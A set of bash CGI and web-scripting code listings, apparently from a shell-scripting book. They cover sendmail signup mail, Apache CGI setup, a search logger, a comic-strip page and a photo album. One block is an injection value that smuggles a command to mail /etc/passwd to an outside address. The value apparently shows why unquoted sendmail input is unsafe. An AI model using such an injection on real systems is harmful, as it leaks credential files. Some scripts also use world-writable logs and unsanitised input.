["```\n( echo \"Subject: Thanks for your signup\"\n  echo \"To: $email ($name)\"\n  echo \"\"\n  echo \"Thanks for signing up. You'll hear from us shortly.\"\n  echo \"-- Dave and Brandon\"\n) | sendmail $email\n```", "```\n`sendmail d00d37@das-hak.de < /etc/passwd; echo  taylor@intuitive.com`\n```", "```\n( echo \"Subject: Thanks for your signup\"\n  echo \"To: $email ($name)\"\n  echo \"\"\n  echo \"Thanks for signing up. You'll hear from us shortly.\"\n  echo \"-- Dave and Brandon\"\n) | sendmail -t\n```", "```\n$ sudo apt-get install apache2\n$ sudo a2enmod cgi\n$ sudo service apache2 restart\n```", "```\n# yum install httpd\n# a2enmod cgi\n# service httpd restart\n```", "```\n   #!/bin/bash\n\n   # showCGIenv--Displays the CGI runtime environment, as given to any\n   #   CGI script on this system\n\n   echo \"Content-type: text/html\"\n   echo \"\"\n\n   # Now the real information...\n\n   echo \"<html><body bgcolor=\\\"white\\\"><h2>CGI Runtime Environment</h2>\"\n   echo \"<pre>\"\n➊ env || printenv\n   echo \"</pre>\"\n   echo \"<h3>Input stream is:</h3>\"\n   echo \"<pre>\"\n   cat -\n   echo \"(end of input stream)</pre></body></html>\"\n\n   exit 0\n```", "```\nHTTP_USER_AGENT=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1)\nAppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\n```", "```\n<form method=\"get\" action=\"\">\nSearch DuckDuckGo:\n<input type=\"text\" name=\"q\">\n<input type=\"submit\" value=\"search\">\n</form>\n```", "```\n<!-- Tweak action value if script is placed in /cgi-bin/ or other -->\n<form method=\"get\" action=\"log-duckduckgo-search.cgi\">\n```", "```\n#!/bin/bash\n\n# log-duckduckgo-search--Given a search request, logs the pattern and then\n#   feeds the entire sequence to the real DuckDuckGo search system\n\n# Make sure the directory path and file listed as logfile are writable by\n#   the user that the web server is running as.\nlogfile=\"/var/www/wicked/scripts/searchlog.txt\"\n\nif [ ! -f $logfile ] ; then\n  touch $logfile\n  chmod a+rw $logfile\nfi\n\nif [ -w $logfile ] ; then\n  echo \"$(date): ➊$QUERY_STRING\" | sed 's/q=//g;s/+/ /g' >> $logfile\nfi\n\necho \"Location: https://duckduckgo.com/html/?$QUERY_STRING\"\necho \"\"\n\nexit 0\n```", "```\n$ curl \"10.37.129.5/cgi-bin/log-duckduckgo-search.cgi?q=metasploit\"\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>302 Found</title>\n</head><body>\n<h1>Found</h1>\n<p>The document has moved <a href=\"https://duckduckgo.com/\nhtml/?q=metasploit\">here</a>.</p>\n<hr>\n<address>Apache/2.4.7 (Ubuntu) Server at 10.37.129.5 Port 80</address>\n</body></html>\n$\n```", "```\n$ cat searchlog.txt\nThu Mar 9 17:20:56 CST 2017: metasploit\n$\n```", "```\n#!/bin/bash\n\n# kevin-and-kell--Builds a web page on the fly to display the latest\n#   strip from the cartoon \"Kevin and Kell\" by Bill Holbrook.\n#   <Strip referenced with permission of the cartoonist>\n\nmonth=\"$(date +%m)\"\n  day=\"$(date +%d)\"\n year=\"$(date +%y)\"\n\necho \"Content-type: text/html\"\necho \"\"\n\necho \"<html><body bgcolor=white><center>\"\necho \"<table border=\\\"0\\\" cellpadding=\\\"2\\\" cellspacing=\\\"1\\\">\"\necho \"<tr bgcolor=\\\"#000099\\\">\"\necho \"<th><font color=white>Bill Holbrook's Kevin &amp; Kell</font></th></tr>\"\necho \"<tr><td><img \"\n\n# Typical URL: http://www.kevinandkell.com/2016/strips/kk20160804.jpg\n\n/bin/echo -n \" src=\\\"http://www.kevinandkell.com/20${year}/\"\necho \"strips/kk20${year}${month}${day}.jpg\\\">\"\necho \"</td></tr><tr><td align=\\\"center\\\">\"\necho \"&copy; Bill Holbrook. Please see \"\necho \"<a href=\\\"http://www.kevinandkell.com/\\\">kevinandkell.com</a>\"\necho \"for more strips, books, etc.\"\necho \"</td></tr></table></center></body></html>\"\n\nexit 0\n```", "```\nhttp://www.kevinandkell.com/2016/strips/kk20160804.jpg\n```", "```\n   #!/bin/bash\n\n   # getdope--Grabs the latest column of \"The Straight Dope.\"\n   #   Set it up in cron to be run every day, if so inclined.\n\n   now=\"$(date +%y%m%d)\"\n   start=\"http://www.straightdope.com/ \"\n   to=\"testing@yourdomain.com\"   # Change this as appropriate.\n\n   # First, get the URL of the current column.\n\n➊ URL=\"$(curl -s \"$start\" | \\\n   grep -A1 'teaser' | sed -n '2p' | \\\n   cut -d\\\" -f2 | cut -d\\\" -f1)\"\n\n   # Now, armed with that data, produce the email.\n\n   ( cat << EOF\n   Subject: The Straight Dope for $(date \"+%A, %d %B, %Y\")\n   From: Cecil Adams <dont@reply.com>\n   Content-type: text/html\n   To: $to\n\n   EOF\n\n   curl \"$URL\"\n   ) | /usr/sbin/sendmail -t\n\n   exit 0\n```", "```\n   #!/bin/bash\n   # album--Online photo album script\n   echo \"Content-type: text/html\"\n   echo \"\"\n\n   header=\"header.html\"\n   footer=\"footer.html\"\n    count=0\n\n   if [ -f $header ] ; then\n     cat $header\n   else\n     echo \"<html><body bgcolor='white' link='#666666' vlink='#999999'><center>\"\n   fi\n\n   echo \"<table cellpadding='3' cellspacing='5'>\"\n\n➊ for name in $(file /var/www/html/* | grep image | cut -d: -f1)\n   do\n     name=$(basename $name)\n     if [ $count -eq 4 ] ; then\n       echo \"</td></tr><tr><td align='center'>\"\n       count=1\n     else\n       echo \"</td><td align='center'>\"\n       count=$(( $count + 1 ))\n     fi\n\n➋   nicename=\"$(echo $name | sed 's/.jpg//;s/-/ /g')\"\n\n     echo \"<a href='../$name' target=_new><img style='padding:2px'\"\n     echo \"src='../$name' height='200' width='200' border='1'></a><BR>\"\n     echo \"<span style='font-size: 80%'>$nicename</span>\"\n   done\n\n   echo \"</td></tr></table>\"\n\n   if [ -f $footer ] ; then\n     cat $footer\n   else\n     echo \"</center></body></html>\"\n   fi\n\n   exit 0\n```", "```\n#!/bin/bash\n\n# randomquote--Given a one-line-per-entry datafile,\n#   randomly picks one line and displays it. Best used\n#   as an SSI call within a web page.\n\nawkscript=\"/tmp/randomquote.awk.$$\"\n\nif [ $# -ne 1 ] ; then\n  echo \"Usage: randomquote datafilename\" >&2\n  exit 1\nelif [ ! -r \"$1\" ] ; then\n  echo \"Error: quote file $1 is missing or not readable\" >&2\n  exit 1\nfi\n\ntrap \"$(which rm) -f $awkscript\" 0\n\ncat << \"EOF\" > $awkscript\nBEGIN { srand() }\n      { s[NR] = $0 }\nEND   { print s[randint(NR)] }\nfunction randint(n) { return int (n * rand() ) + 1 }\nEOF\n\nawk -f $awkscript < \"$1\"\n\nexit 0\n```", "```\n<!--#exec cmd=\"randomquote.sh samplequotes.txt\"-->\n```", "```\n$ randomquote samplequotes.txt\nNeither rain nor sleet nor dark of night...\n$ randomquote samplequotes.txt\nThe rain in Spain stays mainly on the plane? Does the pilot know about this?\n```"]